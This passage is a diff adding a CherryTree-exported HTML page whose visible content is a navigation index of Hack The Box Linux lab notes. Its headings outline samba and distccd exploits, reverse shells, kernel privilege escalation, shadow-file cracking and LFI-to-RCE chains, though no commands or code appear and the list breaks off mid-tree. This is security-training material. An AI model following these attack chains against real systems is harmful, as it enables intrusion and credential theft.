@@ -1,0 +1,1761 @@
+<!doctype html><html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>nmap</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="styles.css" type="text/css" />
+</head>
+<body><div class="main"><div class="tree">
+<p><strong>Index</strong></p>
+<p><a href="HacktheBox--Linux_Boxes.html">Linux Boxes</a></p>
+
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--Lame.html">Lame</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--Lame--nmap.html">nmap</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--Lame--nmap--all_ports.html">all ports</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--Lame--ftp_vsftpd.html">ftp vsftpd</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--Lame--ftp_vsftpd--nmap_scripts.html">nmap scripts</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--Lame--samba_exploit.html">samba exploit</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--Lame--samba_exploit--root_through_Metasploit.html">root through Metasploit</a></li>
+<li><a href="HacktheBox--Linux_Boxes--Lame--samba_exploit--root_without_metasploit.html">root without metasploit</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--Lame--samba_exploit--root_without_metasploit---tmp_share.html">/tmp share</a></li>
+<li><a href="HacktheBox--Linux_Boxes--Lame--samba_exploit--root_without_metasploit--reverse_shell.html">reverse shell</a></li>
+<li><a href="HacktheBox--Linux_Boxes--Lame--samba_exploit--root_without_metasploit--potential_problem_with_smbclient_2020_kali.html">potential problem with smbclient 2020 kali</a></li>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--Lame--distccd_v1_exploit.html">distccd v1 exploit</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--Lame--distccd_v1_exploit--nmap_script_.cmd_execution.html">nmap script .cmd execution</a></li>
+<li><a href="HacktheBox--Linux_Boxes--Lame--distccd_v1_exploit--privilege_escalation.html">privilege escalation</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--Lame--distccd_v1_exploit--privilege_escalation---linux-exploit-suggestor-2.pl.html">/linux-exploit-suggestor-2.pl</a></li>
+<li><a href="HacktheBox--Linux_Boxes--Lame--distccd_v1_exploit--privilege_escalation--dirty_cow_(failed).html">dirty cow (failed)</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--Lame--distccd_v1_exploit--privilege_escalation--dirty_cow_(failed)--dirty_cow_as_makis.html">dirty cow as makis</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--Lame--distccd_v1_exploit--privilege_escalation--8572.c_(success).html">8572.c (success)</a></li>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--Lame--post_exploitation_password_cracking.html">post exploitation password cracking</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--Lame--post_exploitation_password_cracking---etc-shadow.html">/etc/shadow</a></li>
+<li><a href="HacktheBox--Linux_Boxes--Lame--post_exploitation_password_cracking--hashes.html">hashes</a></li>
+<li><a href="HacktheBox--Linux_Boxes--Lame--post_exploitation_password_cracking--hashcat.html">hashcat</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--Lame--lessons_learned.html">lessons learned</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--brainfk.html">brainfk</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--brainfk--nmap.html">nmap</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--brainfk--nmap--all_prts.html">all prts</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--brainfk--http.html">http</a></li>
+<li><a href="HacktheBox--Linux_Boxes--brainfk--certficate.html">certficate</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--brainfk--certficate--General.html">General</a></li>
+<li><a href="HacktheBox--Linux_Boxes--brainfk--certficate--Details.html">Details</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--brainfk--certficate--Details--email.html">email</a></li>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--brainfk---etc-hosts.html">/etc/hosts</a></li>
+<li><a href="HacktheBox--Linux_Boxes--brainfk--brainfuck.htb_is_wordpress.html">brainfuck.htb is wordpress</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--brainfk--brainfuck.htb_is_wordpress--wpsscan.html">wpsscan</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--brainfk--brainfuck.htb_is_wordpress--wpsscan--Report.html">Report</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--brainfk--brainfuck.htb_is_wordpress--wpsscan--Report--ticket_response_searchsploit.html">ticket response searchsploit</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--brainfk--brainfuck.htb_is_wordpress--wpsscan--Report--ticket_response_searchsploit--vi_exploit.html.html">vi exploit.html</a></li>
+<li><a href="HacktheBox--Linux_Boxes--brainfk--brainfuck.htb_is_wordpress--wpsscan--Report--ticket_response_searchsploit--host_exploit.html.html">host exploit.html</a></li>
+<li><a href="HacktheBox--Linux_Boxes--brainfk--brainfuck.htb_is_wordpress--wpsscan--Report--ticket_response_searchsploit--burp_suite.html">burp suite</a></li>
+<li><a href="HacktheBox--Linux_Boxes--brainfk--brainfuck.htb_is_wordpress--wpsscan--Report--ticket_response_searchsploit--admin_login_page.html">admin login page</a></li>
+<ol>
+<li><a href="x_Boxes--brainfk--brainfuck.htb_is_wordpress--wpsscan--Report--ticket_response_searchsploit--admin_login_page--cannot_edit_template_files.html">cannot edit template files</a></li>
+</ol>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--brainfk--brainfuck.htb_is_wordpress--wpsscan--enumerate_users.html">enumerate users</a></li>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--brainfk--SMTP_Integration_is_ready.html">SMTP Integration is ready</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--brainfk--SMTP_Integration_is_ready--Easy_WP-SMTP.html">Easy WP-SMTP</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--brainfk--SMTP_Integration_is_ready--Easy_WP-SMTP--smtp_password.html">smtp password</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--brainfk--SMTP_Integration_is_ready--thunderbird_email.html">thunderbird email</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--brainfk--SMTP_Integration_is_ready--thunderbird_email--sup3rs3cr3t_creds.html">sup3rs3cr3t creds</a></li>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--brainfk--Sup3rs3cr3t.htb.html">Sup3rs3cr3t.htb</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--brainfk--Sup3rs3cr3t.htb--SSH_Access_Forum.html">SSH Access Forum</a></li>
+<li><a href="HacktheBox--Linux_Boxes--brainfk--Sup3rs3cr3t.htb--key_thread.html">key thread</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--brainfk--Sup3rs3cr3t.htb--key_thread--orestis_cipher.html">orestis cipher</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--brainfk--Sup3rs3cr3t.htb--rumkin_cipher.html">rumkin cipher</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--brainfk--Sup3rs3cr3t.htb--rumkin_cipher--one_time_pad.html">one time pad</a></li>
+<li><a href="HacktheBox--Linux_Boxes--brainfk--Sup3rs3cr3t.htb--rumkin_cipher--keyed_vigenere_cipher.html">keyed vigenere cipher</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--brainfk--Sup3rs3cr3t.htb--rumkin_cipher--keyed_vigenere_cipher--decoded_convo.html">decoded convo</a></li>
+</ol>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--brainfk--id_rsa.html">id_rsa</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--brainfk--id_rsa--bruteforce_with_ssh2john.html">bruteforce with ssh2john</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--brainfk--ssh_orestis.html">ssh orestis</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--brainfk--ssh_orestis--debug.txt.html">debug.txt</a></li>
+<li><a href="HacktheBox--Linux_Boxes--brainfk--ssh_orestis--output.txt.html">output.txt</a></li>
+<li><a href="HacktheBox--Linux_Boxes--brainfk--ssh_orestis--encrypt.sage.html">encrypt.sage</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--brainfk--ssh_orestis--encrypt.sage--rsa_with_p_q_and_e.html">rsa with p q and e </a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--brainfk--ssh_orestis--encrypt.sage--rsa_with_p_q_and_e--decrypt.html">decrypt</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--brainfk--ssh_orestis--encrypt.sage--script.html">script</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--brainfk--ssh_orestis--decrypt.sage.html">decrypt.sage</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--brainfk--ssh_orestis--decrypt.sage--python.html">python</a></li>
+<li><a href="HacktheBox--Linux_Boxes--brainfk--ssh_orestis--decrypt.sage--decode_root.txt.html">decode root.txt</a></li>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--brainfk--user-root.html">user/root</a></li>
+<li><a href="HacktheBox--Linux_Boxes--brainfk--lessons_learned.html">lessons learned</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--bashed.html">bashed</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--bashed--nmap.html">nmap</a></li>
+<li><a href="HacktheBox--Linux_Boxes--bashed--phpbash_github.html">phpbash github</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--bashed--phpbash_github--phpbash.php_source_code.html">phpbash.php source code</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--bashed--http.html">http</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--bashed--http--gobuster.html">gobuster</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--bashed--http--gobuster--dev-phpbash.min.php.html">dev/phpbash.min.php</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--bashed--http--gobuster--dev-phpbash.min.php--uploads.html">uploads</a></li>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--bashed--http--foothold_calling_back_reverse_shell_with_php.rev.html">foothold calling back reverse shell with php.rev</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--bashed--priv_esc_to_scriptmanager.html">priv esc to scriptmanager</a></li>
+<li><a href="HacktheBox--Linux_Boxes--bashed--priv_esc_to_root.html">priv esc to root</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--bashed--priv_esc_to_root--Linux_smart_enumeration.html">Linux smart enumeration</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--bashed--priv_esc_to_root--Linux_smart_enumeration--upload_lse.sh.html">upload lse.sh</a></li>
+<li><a href="HacktheBox--Linux_Boxes--bashed--priv_esc_to_root--Linux_smart_enumeration--lse_report.html">lse report</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--bashed--priv_esc_to_root--test.py_cron_job.html">test.py cron job</a></li>
+<li><a href="HacktheBox--Linux_Boxes--bashed--priv_esc_to_root--reverse_shell.html">reverse shell</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--bashed--user-root.html">user/root</a></li>
+<li><a href="HacktheBox--Linux_Boxes--bashed--lessons_learned.html">lessons learned</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--nibbles.html">nibbles</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--nibbles--nmap.html">nmap</a></li>
+<li><a href="HacktheBox--Linux_Boxes--nibbles--http.html">http</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--nibbles--http--gobuster.html">gobuster</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--nibbles--http--gobuster---admin.html">/admin</a></li>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--nibbles--initial_foothold.html">initial foothold</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--nibbles--initial_foothold--default_credentials_to_nibbleblog_admin.html">default credentials to nibbleblog admin</a></li>
+<li><a href="HacktheBox--Linux_Boxes--nibbles--initial_foothold--upload_pic.html">upload pic</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--nibbles--initial_foothold--upload_pic--OR_upload_cmd.php_for_RCE.html">OR upload cmd.php for RCE</a></li>
+<li><a href="HacktheBox--Linux_Boxes--nibbles--initial_foothold--upload_pic--reverse_shell.html">reverse shell</a></li>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--nibbles--privesc_through_monitor.sh_file_creation.html">privesc through monitor.sh file creation</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--nibbles--privesc_through_monitor.sh_file_creation--vi_monitor.sh.html">vi monitor.sh</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--nibbles--priv_esc_through_rationallove_kernel_exploit.html">priv esc through rationallove kernel exploit </a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--nibbles--priv_esc_through_rationallove_kernel_exploit--rationallove.c.html">rationallove.c</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--nibbles--user-root.html">user/root</a></li>
+<li><a href="HacktheBox--Linux_Boxes--nibbles--lessons_learned.html">lessons learned</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--poison.html">poison</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--poison--nmap.html">nmap</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--poison--nmap--all_ports.html">all ports</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--poison--http.html">http</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--poison--http--gobuster.html">gobuster</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--poison--http--gobuster--ini.php.html">ini.php</a></li>
+<li><a href="HacktheBox--Linux_Boxes--poison--http--gobuster--info.php.html">info.php</a></li>
+<li><a href="HacktheBox--Linux_Boxes--poison--http--gobuster--phpinfo.html">phpinfo</a></li>
+<li><a href="HacktheBox--Linux_Boxes--poison--http--gobuster--listedfiles.php.html">listedfiles.php</a></li>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--poison--foothold_1_backuppasswd.txt.html">foothold 1 backuppasswd.txt</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--poison--foothold_1_backuppasswd.txt--base64_decode.py.html">base64_decode.py</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--poison--foothold_1_backuppasswd.txt--base64_decode.py--scriptname_=_-etc-passwd.html">scriptname = /etc/passwd</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--poison--foothold_1_backuppasswd.txt--ssh_charix.html">ssh charix</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--poison--foothold_2_phpinfo.php_race_condition.html">foothold 2: phpinfo.php race condition</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--poison--foothold_2_phpinfo.php_race_condition--race_condition_concept_w-_burp.html">race condition concept w/ burp</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--poison--foothold_2_phpinfo.php_race_condition--race_condition_concept_w-_burp--phpinfo.php_php_variables.html">phpinfo.php php variables</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--poison--foothold_2_phpinfo.php_race_condition--payloadallthethings.html">payloadallthethings</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--poison--foothold_2_phpinfo.php_race_condition--payloadallthethings--revshell.php.html">revshell.php</a></li>
+<li><a href="HacktheBox--Linux_Boxes--poison--foothold_2_phpinfo.php_race_condition--payloadallthethings--phpinfolfi.py.html">phpinfolfi.py</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--poison--foothold_2_phpinfo.php_race_condition--payloadallthethings--phpinfolfi.py--tweak_REQ1.html">tweak REQ1</a></li>
+<li><a href="HacktheBox--Linux_Boxes--poison--foothold_2_phpinfo.php_race_condition--payloadallthethings--phpinfolfi.py--tweak_tmp_name_phpinfo_output.html">tweak tmp_name phpinfo output</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--poison--foothold_2_phpinfo.php_race_condition--payloadallthethings--run.html">run</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--poison--foothold_2_phpinfo.php_race_condition---var-log-httpd-access.log.html">/var/log/httpd-access.log</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--poison--foothold_3_Log_Poisoning.html">foothold 3: Log Poisoning</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--poison--foothold_3_Log_Poisoning--user-agent_manipulation.html">user-agent manipulation</a></li>
+<li><a href="HacktheBox--Linux_Boxes--poison--foothold_3_Log_Poisoning--user-agent_php_code_execution.html">user-agent php code execution</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--poison--foothold_3_Log_Poisoning--user-agent_php_code_execution--Warning_about_using_double-quotes.html">Warning about using double-quotes</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--poison--foothold_3_Log_Poisoning--injecting_php_system_call.html">injecting php system call</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--poison--foothold_3_Log_Poisoning--injecting_php_system_call--hostname_&_ls_-la.html">hostname & ls -la</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--poison--foothold_3_Log_Poisoning--reverse_shell.html">reverse shell</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--poison--priv_esc.html">priv esc</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--poison--priv_esc--secret.zip_exfiltration.html">secret.zip exfiltration</a></li>
+<li><a href="HacktheBox--Linux_Boxes--poison--priv_esc--ps_-aux.html">ps -aux</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--poison--priv_esc--ps_-aux--VNC.html">VNC</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--poison--priv_esc--VNC_port_5901.html">VNC port 5901</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--poison--priv_esc--VNC_port_5901--tunnel_port_5901_through_localhost.html">tunnel port 5901 through localhost</a></li>
+<li><a href="HacktheBox--Linux_Boxes--poison--priv_esc--VNC_port_5901--vncviewer_within_tunneled_localhost.html">vncviewer within tunneled localhost</a></li>
+<li><a href="HacktheBox--Linux_Boxes--poison--priv_esc--VNC_port_5901--root.html">root</a></li>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--poison--user-root.html">user/root</a></li>
+<li><a href="HacktheBox--Linux_Boxes--poison--lessons_learned.html">lessons learned</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--popcorn.html">popcorn</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--popcorn--nmap.html">nmap</a></li>
+<li><a href="HacktheBox--Linux_Boxes--popcorn--http.html">http</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--popcorn--http--dirbuster.html">dirbuster</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--popcorn--http--dirbuster---test.html">/test</a></li>
+<li><a href="HacktheBox--Linux_Boxes--popcorn--http--dirbuster---torrent.html">/torrent</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--popcorn--http--dirbuster---torrent--register.html">register</a></li>
+<li><a href="HacktheBox--Linux_Boxes--popcorn--http--dirbuster---torrent--upload.html">upload</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--popcorn--http--dirbuster---torrent--upload--upload_save_directory.html">upload save directory</a></li>
+<li><a href="HacktheBox--Linux_Boxes--popcorn--http--dirbuster---torrent--upload--upload_noss.png.html">upload noss.png </a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--popcorn--http--dirbuster---torrent--upload--upload_noss.png--kali_torrent_dl_and_upload_(fail).html">kali torrent dl and upload (fail)</a></li>
+<li><a href="HacktheBox--Linux_Boxes--popcorn--http--dirbuster---torrent--upload--upload_noss.png--test.torrent_(fail).html">test.torrent (fail)</a></li>
+<li><a href="HacktheBox--Linux_Boxes--popcorn--http--dirbuster---torrent--upload--upload_noss.png--torrent_file_(success).html">torrent file (success)</a></li>
+<ol>
+<li><a href="ox--Linux_Boxes--popcorn--http--dirbuster---torrent--upload--upload_noss.png--torrent_file_(success)--edit_this_torrent-change_screenshot.html">edit this torrent/change screenshot</a></li>
+<li><a href="Box--Linux_Boxes--popcorn--http--dirbuster---torrent--upload--upload_noss.png--torrent_file_(success)--Repeater_simple_php_code_injection.html">Repeater simple php code injection</a></li>
+<ol>
+<li><a href="orn--http--dirbuster---torrent--upload--upload_noss.png--torrent_file_(success)--Repeater_simple_php_code_injection--wget_tcp_pty_handler.html">wget tcp_pty_handler</a></li>
+<li><a href="s--popcorn--http--dirbuster---torrent--upload--upload_noss.png--torrent_file_(success)--Repeater_simple_php_code_injection--reverse_shell.html">reverse shell</a></li>
+</ol>
+</ol>
+</ol>
+</ol>
+</ol>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--popcorn--Privesc.html">Privesc</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--popcorn--Privesc--lse.sh.html">lse.sh</a></li>
+<li><a href="HacktheBox--Linux_Boxes--popcorn--Privesc--MotD_Privesc.html">MotD Privesc</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--popcorn--Privesc--MotD_Privesc--14339.sh.html">14339.sh</a></li>
+<li><a href="HacktheBox--Linux_Boxes--popcorn--Privesc--MotD_Privesc--14339.sh_raw_code.html">14339.sh raw code</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--popcorn--Privesc--root.html">root</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--popcorn--lessons_learned.html">lessons learned</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--sense.html">sense</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--sense--nmap.html">nmap</a></li>
+<li><a href="HacktheBox--Linux_Boxes--sense--http.html">http</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--sense--http--gobuster.html">gobuster</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--sense--http--gobuster---themes.html">/themes</a></li>
+<li><a href="HacktheBox--Linux_Boxes--sense--http--gobuster---css.html">/css</a></li>
+<li><a href="HacktheBox--Linux_Boxes--sense--http--gobuster---changelog.txt.html">/changelog.txt</a></li>
+<li><a href="HacktheBox--Linux_Boxes--sense--http--gobuster---system-users.txt.html">/system-users.txt </a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--sense--http--ssl_cert.html">ssl cert</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--sense--Rohit_pfsense_login.html">Rohit pfsense login</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--sense--Rohit_pfsense_login--version.html">version </a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--sense--Rohit_pfsense_login--version--searchsploit.html">searchsploit</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--sense--Rohit_pfsense_login--version--searchsploit--cmd_injection_exploit.html">cmd injection exploit</a></li>
+<li><a href="HacktheBox--Linux_Boxes--sense--Rohit_pfsense_login--version--searchsploit--exploit_run.html">exploit run</a></li>
+</ol>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--sense--user-root.html">user/root</a></li>
+<li><a href="HacktheBox--Linux_Boxes--sense--lessons_learned.html">lessons learned</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--beep.html">beep</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--beep--nmap.html">nmap</a></li>
+<li><a href="HacktheBox--Linux_Boxes--beep--http.html">http</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--beep--http--gobuster.html">gobuster</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--beep--http--gobuster---help.html">/help</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--beep--http--gobuster---help--beep_backup_date_2010.html">beep backup date 2010</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--beep--http--gobuster---admin.html">/admin</a></li>
+<li><a href="HacktheBox--Linux_Boxes--beep--http--gobuster---mail.html">/mail</a></li>
+<li><a href="HacktheBox--Linux_Boxes--beep--http--gobuster---recordings.html">/recordings</a></li>
+<li><a href="HacktheBox--Linux_Boxes--beep--http--gobuster---vtigercrm.html">/vtigercrm</a></li>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--beep--rooting_box_through_LFI_turned_to_RCE.html">rooting box through LFI turned to RCE</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--beep--rooting_box_through_LFI_turned_to_RCE--graph.php_LFI.html">graph.php LFI </a></li>
+<li><a href="HacktheBox--Linux_Boxes--beep--rooting_box_through_LFI_turned_to_RCE---vtigercrm-graph.phpcurrent_language_exploit.html">/vtigercrm/graph.php?current_language exploit
+</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--beep--rooting_box_through_LFI_turned_to_RCE---vtigercrm-graph.phpcurrent_language_exploit--pw.html">pw</a></li>
+<li><a href="HacktheBox--Linux_Boxes--beep--rooting_box_through_LFI_turned_to_RCE---vtigercrm-graph.phpcurrent_language_exploit--ssh_root.html">ssh root</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--beep--rooting_box_through_LFI_turned_to_RCE--more_LFI_exploit_info_gathering_w-_burp.html">more LFI exploit info gathering w/ burp </a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--beep--rooting_box_through_LFI_turned_to_RCE--more_LFI_exploit_info_gathering_w-_burp---etc-passwd.html">/etc/passwd</a></li>
+<ol>
+<li><a href="theBox--Linux_Boxes--beep--rooting_box_through_LFI_turned_to_RCE--more_LFI_exploit_info_gathering_w-_burp---etc-passwd---etc-passwd_users.html">/etc/passwd users</a></li>
+<ol>
+<li><a href="s--beep--rooting_box_through_LFI_turned_to_RCE--more_LFI_exploit_info_gathering_w-_burp---etc-passwd---etc-passwd_users--user_enumeration.html">user enumeration</a></li>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--beep--rooting_box_through_LFI_turned_to_RCE--more_LFI_exploit_info_gathering_w-_burp---proc-self-status.html">/proc/self/status</a></li>
+<ol>
+<li><a href="s--beep--rooting_box_through_LFI_turned_to_RCE--more_LFI_exploit_info_gathering_w-_burp---proc-self-status---var-lib-asterisk-.ssh-id_rsa.html">/var/lib/asterisk/.ssh/id_rsa</a></li>
+</ol>
+<li><a href="--rooting_box_through_LFI_turned_to_RCE--more_LFI_exploit_info_gathering_w-_burp--leaking_more_sensitive_files_with_burp_suite's_intruder.html">leaking more sensitive files with burp suite's intruder</a></li>
+<ol>
+<li><a href="hrough_LFI_turned_to_RCE--more_LFI_exploit_info_gathering_w-_burp--leaking_more_sensitive_files_with_burp_suite's_intruder--fuzzdb_github.html">fuzzdb github</a></li>
+<ol>
+<li><a href="CE--more_LFI_exploit_info_gathering_w-_burp--leaking_more_sensitive_files_with_burp_suite's_intruder--fuzzdb_github--LFI-LogFileCheck.txt.html">LFI-LogFileCheck.txt</a></li>
+</ol>
+<li><a href="LFI_turned_to_RCE--more_LFI_exploit_info_gathering_w-_burp--leaking_more_sensitive_files_with_burp_suite's_intruder--fuzzdb_LFI_checklist.html">fuzzdb LFI checklist</a></li>
+<ol>
+<li><a href="d_to_RCE--more_LFI_exploit_info_gathering_w-_burp--leaking_more_sensitive_files_with_burp_suite's_intruder--fuzzdb_LFI_checklist--results.html">results</a></li>
+</ol>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--beep--rooting_box_through_LFI_turned_to_RCE--turning_LFI_to_RCE_through_SMTP_php_code_embedded_email.html">turning LFI to RCE through SMTP php code embedded email</a></li>
+<ol>
+<li><a href="oxes--beep--rooting_box_through_LFI_turned_to_RCE--turning_LFI_to_RCE_through_SMTP_php_code_embedded_email--php_code_injection_into_email.html">php code injection into email</a></li>
+<li><a href="Box--Linux_Boxes--beep--rooting_box_through_LFI_turned_to_RCE--turning_LFI_to_RCE_through_SMTP_php_code_embedded_email--burp_payload_test.html">burp payload test</a></li>
+<ol>
+<li><a href="--beep--rooting_box_through_LFI_turned_to_RCE--turning_LFI_to_RCE_through_SMTP_php_code_embedded_email--burp_payload_test--code_execution.html">code execution</a></li>
+</ol>
+<li><a href="p--rooting_box_through_LFI_turned_to_RCE--turning_LFI_to_RCE_through_SMTP_php_code_embedded_email--swap_to_post_request_for_reverse_shell.html">swap to post request for reverse shell</a></li>
+<ol>
+<li><a href="x_through_LFI_turned_to_RCE--turning_LFI_to_RCE_through_SMTP_php_code_embedded_email--swap_to_post_request_for_reverse_shell--nc_listener.html">nc listener</a></li>
+<li><a href="g_box_through_LFI_turned_to_RCE--turning_LFI_to_RCE_through_SMTP_php_code_embedded_email--swap_to_post_request_for_reverse_shell--sudo_-l.html">sudo -l</a></li>
+<ol>
+<li><a href="urning_LFI_to_RCE_through_SMTP_php_code_embedded_email--swap_to_post_request_for_reverse_shell--sudo_-l--asterisk_can_sudo_on_-etc-passwd.html">asterisk can sudo on /etc/passwd</a></li>
